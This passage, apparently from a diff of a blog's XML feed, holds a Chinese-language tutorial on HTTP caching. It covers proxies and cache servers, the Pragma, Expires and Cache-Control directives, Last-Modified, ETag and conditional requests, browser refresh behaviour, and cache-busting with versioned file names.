+获取资源，而是将之前缓存的资源作为响应返回。</li>
+<li>透明代理（本文不做细致讨论）
+转发请求或响应时，不对报文做任何加工的代理类型被称为透明代理（Transparent Proxy）。反之，对报文内容进行加工的代理被称为非透明代理。</li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-d11ea257f3348fb1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="浏览器、代理、服务器三者关系"></p>
+<h2 id="保存资源的缓存">保存资源的缓存</h2>
+<p>缓存是指代理服务器或客户端本地磁盘内保存的资源副本。利用缓存可减少对源服务器的访问，因此也就节省了通信流量和通信时间。
+缓存服务器是代理服务器的一种，并归类在缓存代理类型中。换句话说，当代理转发从服务器返回的响应时，代理服务器将会保存一份资源的副本。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-f0b2c6574f5d4670.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-d469c7564bf7dc8d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>缓存服务器的优势在于利用缓存可避免多次从源服务器转发资源。因此客户端可就近从缓存服务器上获取资源，而源服务器也不必多次处理相同的请求了。</p>
+<h3 id="缓存的有效期限">缓存的有效期限</h3>
+<p>即便缓存服务器和客户端内有缓存，也不能每次都给我返回缓存吧，如果是这样，源服务器更新了我也不知道，因为我每次都是看缓存的资源。
+为了解决这个问题，针对缓存设计了时效性的概念：
+即使存在缓存，也会因为客户端的要求、缓存的有效期等因素，向源服务器确认资源的有效性。若判断缓存失效，缓存服务器将会再次从源服务器上获取“新”资源。
+<img src="http://upload-images.jianshu.io/upload_images/4337988-7b2ba0f55384fc8b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h3 id="客户端的缓存">客户端的缓存</h3>
+<p>缓存不仅可以存在于缓存服务器内，还可以存在客户端浏览器中。以Internet Explorer 程序为例，把客户端缓存称为临时网络文件（Temporary Internet File）。
+浏览器缓存如果有效，就不必再向服务器请求相同的资源了，可以直接从本地磁盘内读取。
+另外，和缓存服务器相同的一点是，当判定缓存过期后，会向源服务器确认资源的有效性。若判断浏览器缓存失效，浏览器会再次请求新资源。
+<img src="http://upload-images.jianshu.io/upload_images/4337988-299403c724b8a2e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h2 id="与控制缓存相关的http首部字段">与控制缓存相关的HTTP首部字段</h2>
+<h3 id="http10-时代的缓存方式">http1.0 时代的缓存方式</h3>
+<h4 id="pragma">Pragma</h4>
+<p>Pragma 是HTTP/1.1 之前版本的历史遗留字段，仅作为与HTTP/1.0的向后兼容而定义。
+规范定义的形式唯一，如下所示。</p>
+<p><code>Pragma: no-cache</code></p>
+<p>该首部字段属于通用首部字段，但只用在客户端发送的请求中。客户端会要求所有的中间服务器不返回缓存的资源。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-b7cfed33d7dd97aa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>所有的中间服务器如果都能以HTTP/1.1 为基准， 那直接采用Cache-Control: no-cache 指定缓存的处理方式是最为理想的。但要整体掌握全部中间服务器使用的HTTP 协议版本却是不现实的。因此，发送的请求会同时含有下面两个首部字段。</p>
+<pre><code>Cache-Control: no-cache
+Pragma: no-cache
+</code></pre>
+<h4 id="expires">Expires</h4>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-8898bb96dfca4ab5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p><code>Expires: Wed, 04 Jul 2012 08:26:05 GMT</code></p>
+<p>首部字段Expires 会将资源失效的日期告知客户端。缓存服务器在接收到含有首部字段Expires 的响应后，会以缓存来应答请求，在Expires 字段值指定的时间之前，响应的副本会一直被保存。当超过指定的时间后，缓存服务器在请求发送过来时，会转向源服务器请求资源。</p>
+<p>源服务器不希望缓存服务器对资源缓存时，最好在Expires 字段内写入与首部字段Date 相同的时间值。
+但是，当首部字段Cache-Control 有指定max-age 指令时，比起首部字段Expires，会优先处理max-age 指令。</p>
+<h3 id="cache-control">Cache-Control</h3>
+<p>通过指定首部字段Cache-Control 的指令，就能操作缓存的工作机制。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-c3b31fc74a5d48df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="首部字段Cache-Control 能够控制缓存的行为"></p>
+<p>指令的参数是可选的，多个指令之间通过“,”分隔。首部字段Cache-Control 的指令在请求和响应下都适用。</p>
+<p><code>Cache-Control: private, max-age=0, no-cache</code></p>
+<h4 id="cache-control指令一览">Cache-Control指令一览：</h4>
+<p>可用的指令按请求和响应分类如下所示:</p>
+<h4 id="缓存请求指令">缓存请求指令</h4>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th style="text-align:center">参数</th>
+<th style="text-align:right">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>no-cache</td>
+<td style="text-align:center">无</td>
+<td style="text-align:right">强制向源服务器再次验证</td>
+</tr>
+<tr>
+<td>no-store</td>
+<td style="text-align:center">无</td>
+<td style="text-align:right">不缓存请求或响应的任何内容</td>
+</tr>
+<tr>
+<td>max-age = [ 秒]</td>
+<td style="text-align:center">必须有</td>
+<td style="text-align:right">响应的最大Age值</td>
+</tr>
+<tr>
+<td>max-stale( = [ 秒])</td>
+<td style="text-align:center">可省略</td>
+<td style="text-align:right">接收已过期的响应</td>
+</tr>
+<tr>
+<td>min-fresh = [ 秒]</td>
+<td style="text-align:center">必须有</td>
+<td style="text-align:right">期望在指定时间内的响应仍有效</td>
+</tr>
+<tr>
+<td>no-transform</td>
+<td style="text-align:center">无</td>
+<td style="text-align:right">代理不可更改媒体类型</td>
+</tr>
+<tr>
+<td>only-if-cached</td>
+<td style="text-align:center">无</td>
+<td style="text-align:right">从缓存获取资源</td>
+</tr>
+<tr>
+<td>cache-extension</td>
+<td style="text-align:center">-</td>
+<td style="text-align:right">新指令标记（token）</td>
+</tr>
+</tbody>
+</table>
+<h4 id="缓存响应指令">缓存响应指令</h4>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th style="text-align:center">参数</th>
+<th style="text-align:right">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>public</td>
+<td style="text-align:center">无</td>
+<td style="text-align:right">可向任意方提供响应的缓存</td>
+</tr>
+<tr>
+<td>private</td>
+<td style="text-align:center">可省略</td>
+<td style="text-align:right">仅向特定用户返回响应</td>
+</tr>
+<tr>
+<td>no-cache</td>
+<td style="text-align:center">可省略</td>
+<td style="text-align:right">缓存前必须先确认其有效性</td>
+</tr>
+<tr>
+<td>no-store</td>
+<td style="text-align:center">无</td>
+<td style="text-align:right">不缓存请求或响应的任何内容</td>
+</tr>
+<tr>
+<td>no-transform</td>
+<td style="text-align:center">无</td>
+<td style="text-align:right">代理不可更改媒体类型</td>
+</tr>
+<tr>
+<td>must-revalidate</td>
+<td style="text-align:center">无</td>
+<td style="text-align:right">可缓存但必须再向源服务器进行确认</td>
+</tr>
+<tr>
+<td>proxy-revalidate</td>
+<td style="text-align:center">无</td>
+<td style="text-align:right">要求缓存服务器对缓存的响应有效性再进行确认</td>
+</tr>
+<tr>
+<td>max-age = [ 秒]</td>
+<td style="text-align:center">必须有</td>
+<td style="text-align:right">响应的最大Age值</td>
+</tr>
+<tr>
+<td>s-maxage = [ 秒]</td>
+<td style="text-align:center">必须有</td>
+<td style="text-align:right">公共缓存服务器响应的最大Age值</td>
+</tr>
+<tr>
+<td>cache-extension</td>
+<td style="text-align:center">-</td>
+<td style="text-align:right">新指令标记（token）</td>
+</tr>
+</tbody>
+</table>
+<h3 id="cache-control指令详细介绍">Cache-Control指令详细介绍</h3>
+<h4 id="表示是否能缓存的指令">表示是否能缓存的指令</h4>
+<p><strong>public指令</strong>
+<code>Cache-Control: public</code></p>
+<p>当指定使用public 指令时，则明确表明其他用户也可利用缓存。</p>
+<p><strong>private指令</strong>
+<img src="http://upload-images.jianshu.io/upload_images/4337988-afbcf62c66df5f58.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p><code>Cache-Control: private</code></p>
+<p>当指定private 指令后，响应只以特定的用户作为对象，这与public
+指令的行为相反。
+缓存服务器会对该特定用户提供资源缓存的服务，对于其他用户发
+送过来的请求，代理服务器则不会返回缓存。</p>
+<p><strong>no-cache指令</strong>
+<img src="http://upload-images.jianshu.io/upload_images/4337988-47544fb4e6259be7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p><code>Cache-Control: no-cache</code></p>
+<p>使用no-cache 指令的目的是为了防止从缓存中返回过期的资源。客户端发送的请求中如果包含no-cache 指令，则表示客户端将不会接收缓存过的响应。于是，“中间”的缓存服务器必须把客户端请求转发给源服务器。
+如果服务器返回的响应中包含no-cache 指令，那么缓存服务器不能对资源进行缓存。源服务器以后也将不再对缓存服务器请求中提出的资源有效性进行确认，且禁止其对响应资源进行缓存操作。</p>
+<p><code>Cache-Control: no-cache=Location</code></p>
+<p>由服务器返回的响应中，若报文首部字段Cache-Control 中对no-cache字段名具体指定参数值，那么客户端在接收到这个被指定参数值的首部字段对应的响应报文后，就不能使用缓存。换言之，无参数值的首部字段可以使用缓存。只能在响应指令中指定该参数。</p>
+<h4 id="控制可执行缓存的对象的指令">控制可执行缓存的对象的指令</h4>
+<p><strong>no-store指令</strong></p>
+<p><code>Cache-Control: no-store</code></p>
+<p>当使用no-store 指令时，暗示请求（和对应的响应）或响应中包含机密信息。
+因此，该指令规定缓存不能在本地存储请求或响应的任一部分。</p>
+<p><strong>ps:从字面意思上很容易把no-cache误解成为不缓存，但事实上no-cache代表不缓存过期的资源，缓存会向源服务器进行有效期确认后处理资源，也许称为do-not-serve-from-cache-without-revalidation更合适。no-store 才是真正地不进行缓存，请读者注意区别理解。</strong></p>
+<h4 id="指定缓存期限和认证的指令">指定缓存期限和认证的指令</h4>
+<p><strong>s-maxage指令</strong></p>
+<p><code>Cache-Control: s-maxage=604800 //（单位：秒）</code></p>
+<p>s-maxage 指令的功能和max-age 指令的功能相同， 它们的不同点是s-maxage 指令只适用于供多位用户使用的公共缓存服务器(这里指代理服务器)。也就是说，对于向同一用户重复返回响应的服务器来说，这个指令没有任何作用。
+另外，当使用s-maxage 指令后，则直接忽略对Expires 首部字段及max-age 指令的处理。</p>
+<p><strong>max-age指令</strong></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-bebb1dd149fa52cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p><code>Cache-Control: max-age=604800 //（单位：秒）</code></p>
+<p>当客户端发送的请求中包含max-age 指令时，如果判定缓存资源的缓存时间数值比指定时间的数值更小，那么客户端就接收缓存的资源。
+另外，当指定max-age 值为0，那么缓存服务器通常需要将请求转发给源服务器。
+当服务器返回的响应中包含max-age 指令时，缓存服务器将不对资源的有效性再作确认，而max-age 数值代表资源保存为缓存的最长时间。
+应用HTTP/1.1 版本的缓存服务器遇到同时存在Expires 首部字段的情况时，会优先处理max-age 指令，而忽略掉Expires 首部字段。而HTTP/1.0 版本的缓存服务器的情况却相反，max-age 指令会被忽略掉。</p>
+<p><strong>min-fresh指令</strong></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-206127d6c4935c12.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p><code>Cache-Control: min-fresh=60 //（单位：秒）</code></p>
+<p>min-fresh 指令要求缓存服务器返回至少还未过指定时间的缓存资源。
+比如，当指定min-fresh 为60 秒后，过了60 秒的资源都无法作为响应返回了。</p>
+<p><strong>max-stale指令</strong></p>
+<p><code>Cache-Control: max-stale=3600 //（单位：秒）</code></p>
+<p>使用max-stale 可指示缓存资源，即使过期也照常接收。
+如果指令未指定参数值，那么无论经过多久，客户端都会接收响应；如果指令中指定了具体数值，那么即使过期，只要仍处于max-stale 指定的时间内，仍旧会被客户端接收。
+<strong>only-if-cached指令</strong></p>
+<p><code>Cache-Control: only-if-cached</code></p>
+<p>使用only-if-cached 指令表示客户端仅在缓存服务器本地缓存目标资源的情况下才会要求其返回。换言之，该指令要求缓存服务器不重新加载响应，也不会再次确认资源有效性。若发生请求缓存服务器的本地缓存无响应，则返回状态码504 Gateway Timeout。
+<strong>must-revalidate指令</strong></p>
+<p><code>Cache-Control: must-revalidate</code></p>
+<p>使用must-revalidate 指令，代理会向源服务器再次验证即将返回的响应缓存目前是否仍然有效。
+若代理无法连通源服务器再次获取有效资源的话，缓存必须给客户端一条504（Gateway Timeout）状态码。
+另外，使用must-revalidate 指令会忽略请求的max-stale 指令（即使已经在首部使用了max-stale，也不会再有效果）。
+<strong>proxy-revalidate指令</strong></p>
+<p><code>Cache-Control: proxy-revalidate</code></p>
+<p>proxy-revalidate 指令要求所有的缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性。
+<strong>no-transform指令</strong></p>
+<p><code>Cache-Control: no-transform</code></p>
+<p>使用no-transform 指令规定无论是在请求还是响应中，缓存都不能改变实体主体的媒体类型。这样做可防止缓存或代理压缩图片等类似操作。</p>
+<h4 id="cache-control-扩展">Cache-Control 扩展</h4>
+<p>cache-extension token</p>
+<p><code>Cache-Control: private, community=&quot;UCI&quot;</code></p>
+<p>通过 cache-extension 标记（token），可以扩展Cache-Control 首部字段内的指令。
+如上例，Cache-Control 首部字段本身没有community 这个指令。借助extension tokens 实现了该指令的添加。如果缓存服务器不能理community 这个新指令，就会直接忽略。因此，extension tokens 仅对能理解它的缓存服务器来说是有意义的。</p>
+<h3 id="last-modified">Last-Modified</h3>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-d614e0b635ec075b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p><code>Last-Modified: Wed, 23 May 2012 09:59:55 GMT</code></p>
+<p>服务器将资源传递给客户端时，会将资源最后更改的时间以“Last-Modified: GMT”的形式加在实体首部上一起返回给客户端。
+当客户端对同样的资源发起同样的请求时，会把该信息附带在请求报文中一并带给服务器去做检查。</p>
+<h4 id="if-modified-since">If-Modified-Since</h4>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-f6990c041841cfc2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>如果在If-Modified-Since 字段指定的日期时间后，资源发生了更新，服务器会接受请求</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-64e1bbb040444dce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p><code>If-Modified-Since: Thu, 15 Apr 2004 00:00:00 GMT</code></p>
+<p>首部字段If-Modified-Since，属附带条件之一，它会告知服务器若If-Modified-Since 字段值早于资源的更新时间，则希望能处理该请求。而在指定If-Modified-Since 字段值的日期时间之后，如果请求的资源都没有过更新，则返回状态码304 Not Modified 的响应。
+If-Modified-Since 用于确认代理或客户端拥有的本地资源的有效性。获取资源的更新日期时间，可通过确认首部字段Last-Modified 来确定。</p>
+<h4 id="if-unmodified-since">If-Unmodified-Since</h4>
+<p><code>If-Unmodified-Since: Thu, 03 Jul 2012 00:00:00 GMT</code></p>
+<p>首部字段If-Unmodified-Since 和首部字段If-Modified-Since 的作用相反。它的作用的是告知服务器，指定的请求资源只有在字段值内指定的日期时间之后，未发生更新的情况下，才能处理请求。如果在指定日期时间后发生了更新，则以状态码412 Precondition Failed 作为响应返回。</p>
+<p><strong>ps:Last-Modified 存在一定问题，如果在服务器上，一个资源被修改了，但其实际内容根本没发生改变，会因为Last-Modified时间匹配不上而返回了整个实体给客户端（即使客户端缓存里有个一模一样的资源）。</strong></p>
+<h3 id="etag">ETag</h3>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-e8e4f1208281051b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p><code>ETag: &quot;82e22293907ce725faf67773957acd12&quot;</code></p>
+<p>首部字段ETag 能告知客户端实体标识。它是一种可将资源以字符串形式做唯一性标识的方式。服务器会为每份资源分配对应的ETag 值。
+另外，当资源更新时，ETag 值也需要更新。生成ETag 值时，并没有统一的算法规则，而仅仅是由服务器来分配。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-39c25b16f7370efa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>资源被缓存时，就会被分配唯一性标识。
+例如，当使用中文版的浏览器访问 http : //www.google.com/ 时，就会返回中文版对应的资源，而使用英文版的浏览器访问时，则会返回英文版对应的资源。
+两者的URI是相同的，所以仅凭URI 指定缓存的资源是相当困难的。若在下载过程中出现连接中断、再连接的情况，都会依照ETag 值来指定资源。</p>
+<h4 id="强etag-值和弱tag-值">强ETag 值和弱Tag 值</h4>
+<ul>
+<li>
+<p>强ETag 值
+强ETag 值，不论实体发生多么细微的变化都会改变其值。
+<code>ETag: &quot;usagi-1234&quot;</code></p>
+</li>
+<li>
+<p>弱ETag 值
+弱ETag 值只用于提示资源是否相同。只有资源发生了根本改变，产
+生差异时才会改变ETag 值。这时，会在字段值最开始处附加W/。
+<code>ETag: W/&quot;usagi-1234&quot;</code></p>
+</li>
+</ul>
+<h4 id="42-if-match">4.2 If-Match</h4>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-b0b9688c6da2da41.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="附带条件请求">
+形如If-xxx 这种样式的请求首部字段，都可称为条件请求。服务器接收到附带条件的请求后，只有判断指定条件为真时，才会执行请求。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-7992f2746e34989e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-20519a333fc1b1b8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="只有当If-Match 的字段值跟ETag 值匹配一致时，服务器才会接受请求"></p>
+<p><code>If-Match: &quot;123456&quot;</code></p>
+<p>首部字段If-Match，属附带条件之一，它会告知服务器匹配资源所用的实体标记（ETag）值。这时的服务器无法使用弱ETag 值。
+服务器会比对If-Match 的字段值和资源的ETag 值，仅当两者一致时，才会执行请求。反之，则返回状态码412 Precondition Failed 的响应。
+还可以使用星号（*）指定If-Match 的字段值。针对这种情况，服务器将会忽略ETag 的值，只要资源存在就处理请求。</p>
+<h4 id="if-none-match">If-None-Match</h4>
+<p>只有在If-None-Match 的字段值与ETag 值不一致时， 可处理该请求。
+与If-Match 首部字段的作用相反</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-2119483682c70515.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>首部字段If-None-Match 属于附带条件之一。它和首部字段If-Match 作用相反。用于指定If-None-Match 字段值的实体标记（ETag）值与请求资源的ETag 不一致时，它就告知服务器处理该请求。
+在GET 或HEAD 方法中使用首部字段If-None-Match 可获取最新的资源。因此，这与使用首部字段If-Modified-Since 时有些类似。</p>
+<h3 id="用户刷新访问行为">用户刷新/访问行为</h3>
+<h4 id="在uri输入栏中输入然后回车">在URI输入栏中输入然后回车</h4>
+<p>不与服务器确认，而是直接使用浏览器缓存的内容。其中响应内容和之前的响应内容一模一样，例如其中的Date时间是上一次响应的时间。</p>
+<h4 id="f5点击工具栏中的刷新按钮右键菜单重新加载">F5/点击工具栏中的刷新按钮/右键菜单重新加载</h4>
+<p>F5的作用和直接在URI输入栏中输入然后回车是不一样的，F5会让浏览器无论如何都发一个HTTP Request给Server，即使先前的响应中有Expires头部。</p>
+<h4 id="ctlf5">Ctl+F5</h4>
+<p>Ctrl+F5要的是彻底的从Server拿一份新的资源过来，所以不光要发送HTTP request给Server，而且这个请求里面连If-Modified-Since/If-None-Match都没有，这样就逼着Server不能返回304，而是把整个资源原原本本地返回一份，这样，Ctrl+F5引发的传输时间变长了，自然网页Refresh的也慢一些。</p>
+<h3 id="缓存实践">缓存实践</h3>
+<h4 id="expires-cache-control">Expires / Cache-Control</h4>
+<p>Cache-Control 是 HTTP1.1 才有的，不适用于 HTTP1.0，而 Expires 既适用于 HTTP1.0，也适用于 HTTP1.1，所以说在大多数情况下同时发送这两个头会是一个更好的选择，当客户端两种头都能解析的时候，会优先使用 Cache-Control。</p>
+<h4 id="last-modified-etag">Last-Modified / ETag</h4>
+<p>二者都是通过某个标识值来请求资源， 如果服务器端的资源没有变化，则自动返回 HTTP 304 （Not Changed）状态码，内容为空，这样就节省了传输数据量。当资源变化后则返回新资源。从而保证不向客户端重复发出资源，也保证当服务器有变化时，客户端能够得到最新的资源。
+其中Last-Modified使用文件最后修改作为文件标识值，它无法处理文件一秒内多次修改的情况，而且只要文件修改了哪怕文件实质内容没有修改，也会重新返回资源内容；ETag作为“被请求变量的实体值”，其完全可以解决Last-Modified头部的问题，但是其计算过程需要耗费服务器资源。</p>
+<h4 id="from-cache-304">from-cache / 304</h4>
+<p>Expires和Cache-Control都有一个问题就是服务端的修改，如果还在缓存时效里，那么客户端是不会去请求服务端资源的（非刷新），这就存在一个资源版本不符的问题，而强制刷新一定会发起HTTP请求并返回资源内容，无论该内容在这段时间内是否修改过；而Last-Modified和Etag每次请求资源都会发起请求，哪怕是很久都不会有修改的资源，都至少有一次请求响应的消耗。
+对于所有可缓存资源，指定一个Expires或Cache-Control max-age以及一个Last-Modified或ETag至关重要。同时使用前者和后者可以很好的相互适应。
+前者不需要每次都发起一次请求来校验资源时效性，后者保证当资源未出现修改的时候不需要重新发送该资源。而在用户的不同刷新页面行为中，二者的结合也能很好的利用HTTP缓存控制特性，无论是在地址栏输入URI然后输入回车进行访问，还是点击刷新按钮，浏览器都能充分利用缓存内容，避免进行不必要的请求与数据传输。</p>
+<h5 id="避免304">避免304</h5>
+<p>做法很简单，就是把可能会更新的资源以版本形式发布，常用的方法是在文件名或参数带上一串md5或时间标记符：</p>
+<pre><code>https://hm.baidu.com/hm.js?e23800c454aa573c0ccb16b52665ac26
+http://tb1.bdstatic.com/tb/_/tbean_safe_ajax_94e7ca2.js
+http://img1.gtimg.com/ninja/2/2016/04/ninja145972803357449.jpg
+</code></pre>
+<p>可以看到上面的例子中有不同的做法，有的在URI后面加上了md5参数，有的将md5值作为文件名的一部分，有的将资源放在特性版本的目录中。
+那么在文件没有变动的时候，浏览器不用发起请求直接可以使用缓存文件；而在文件有变化的时候，由于文件版本号的变更，导致文件名变化，请求的url变了，自然文件就更新了。这样能确保客户端能及时从服务器收取到新修改的文件。通过这样的处理，增长了静态资源，特别是图片资源的缓存时间，避免该资源很快过期，客户端频繁向服务端发起资源请求，服务器再返回304响应的情况（有Last-Modified/Etag）。</p>
+<h2 id="参考资料">参考资料</h2>
+<ul>
+<li><a href="https://book.douban.com/subject/25863515/">《图解HTTP》</a></li>
+<li><a href="http://imweb.io/topic/5795dcb6fb312541492eda8c">HTTP缓存控制小结</a></li>
+</ul>
 ]]></content>
     </entry>
     <entry>
